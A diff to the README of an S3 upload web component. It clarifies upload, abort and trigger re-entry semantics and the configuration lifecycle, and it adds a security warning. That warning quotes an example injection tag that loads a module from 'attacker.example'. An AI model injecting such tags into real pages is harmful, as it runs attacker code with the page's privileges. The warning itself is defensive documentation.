@@ -252,10 +252,10 @@ checks.
 
 | property / method | meaning |
 |---|---|
-| `file` | the `Blob`/`File` to upload. Setting `file` is **passive** — it stores the value and does nothing else. The pending upload is not aborted, restarted, or re-keyed. The new value is consumed by the next `upload()` call (or `trigger=true`). To replace an in-flight upload's payload: call `abort()`, set `file`, then re-trigger. |
-| `upload()` | explicit start. Returns the final download URL. Re-entry is serialized: a call while another upload is in flight aborts the prior one and waits for it to unwind before starting fresh. |
-| `trigger` | attribute-/binding-driven convenience: setting it to `true` calls `upload()` and resets to `false` on completion. Prefer `upload()` from imperative code — `trigger` exists so reactive frameworks can drive the component as a property. |
-| `abort()` | cancel the current upload. Also triggers server-side multipart cleanup when applicable. |
+| `file` | the `Blob`/`File` to upload. Setting `file` is **passive** — it stores the value and does nothing else. The pending upload is not aborted, restarted, or re-keyed. The new value is consumed by the next `upload()` call (or `trigger=true`). To replace an in-flight upload's payload, follow the full await-then-restart pattern documented on `upload()` below (call `abort()`, await the prior promise's settlement, then set `file` and re-trigger). |
+| `upload()` | explicit start. Returns the final download URL. Re-entry is a no-op: a call while another upload is in flight returns the existing in-flight promise (same outcome, no second run). To cancel and restart with new inputs, call `abort()`, await the prior promise's settlement, then call `upload()` again. Example:<br/>`const p = el.upload(); el.abort(); await p.catch(() => {}); await el.upload();` |
+| `trigger` | attribute-/binding-driven convenience: setting it to `true` calls `upload()` and resets to `false` on completion. Prefer `upload()` from imperative code — `trigger` exists so reactive frameworks can drive the component as a property. **Edge-driven command semantics:** setting `trigger=true` while an upload is already in flight is silently ignored — no state change, no `hawc-s3:trigger-changed` event, no second upload. Only the rising edge from `false` to `true` (when no upload is in flight) starts a run. To cancel and re-run, see `upload()` above for the full await-then-restart pattern — `abort(); trigger = true` without awaiting the prior promise's settlement is a silent no-op. |
+| `abort()` | cancel the current upload. Also triggers server-side multipart cleanup when applicable. Note: the `_currentUpload` slot clears only once the aborted promise settles — see `upload()` above for the cancel-and-restart pattern. Calling `upload()` or setting `trigger=true` immediately after `abort()` (without awaiting the prior promise) will observe the still-settling aborted run and be treated as re-entry (returning that promise / silent no-op). |
 
 `key` is a dual-role property: set/attribute it before upload to force the object key,
 then read it as state to get the resolved key emitted by the Core (`hawc-s3:key-changed`).
@@ -304,6 +304,20 @@ then read it as state to get the resolved key emitted by the Core (`hawc-s3:key-
 > If `blob:` is not allowed, use the `src` attribute to point at a real
 > module URL instead — or skip `<hawc-s3-callback>` entirely and subscribe
 > through the wc-bindable adapter your framework already uses (see below).
+
+> **Security warning — XSS-equivalent vector.** `<hawc-s3-callback>`
+> dynamic-imports arbitrary ES modules from either its inline
+> `<script type="module">` child or its `src` attribute. Both are an
+> XSS-equivalent escalation when the surrounding HTML comes from an
+> untrusted source: an attacker who can inject
+> `<hawc-s3-callback src="https://attacker.example/evil.js">` will have
+> their module executed with the same privileges as the page.
+>
+> Do **NOT** mount this element in any context that renders untrusted HTML
+> (comments, user-authored content, server-rendered tenant pages without
+> sanitisation, etc.). For trusted contexts, pair it with a strict CSP
+> (`script-src` / `trusted-types`) that restricts which module URLs are
+> loadable. See the `S3Callback` class JSDoc for the full contract.
 
 #### When NOT to use `<hawc-s3-callback>`
 
@@ -853,6 +867,28 @@ The path prefix is covered by the SigV4 signature, so the reverse proxy must
 forward the request without rewriting the path. If your proxy strips the
 prefix before handing the request to S3, sign against the bare-origin
 endpoint instead.
+
+## Configuration lifecycle
+
+`bootstrapS3()` (or equivalent `setConfig(...)` before auto-registration) is
+intended to be called **once**, **before any `<hawc-s3>` element is
+connected** to the document. The registered tag names, the `enableRemote`
+flag, and the remote-core URL are all read at element-connect time and the
+element caches its own view of the mode it initialised under.
+
+Calling `setConfig` / `bootstrapS3` again after elements have been
+connected is **undefined behaviour**: the existing elements keep their
+cached mode (including whether they have a local `S3Core` or a remote
+proxy), but newly connected elements see the new settings. This inconsistent
+split is rarely what callers want.
+
+- `deleteObject` during an active upload on the **same key** is the
+  caller's responsibility. Core emits a
+  `hawc-s3:delete-during-upload-warning` event when it detects the
+  collision, but it does not auto-abort the upload or fail the delete —
+  both are legitimate protocols. If your flow cannot tolerate the race,
+  call `abort()` on the `<hawc-s3>` element first (or wait for
+  `completed`) before issuing the delete.
 
 ## Package entry points
 
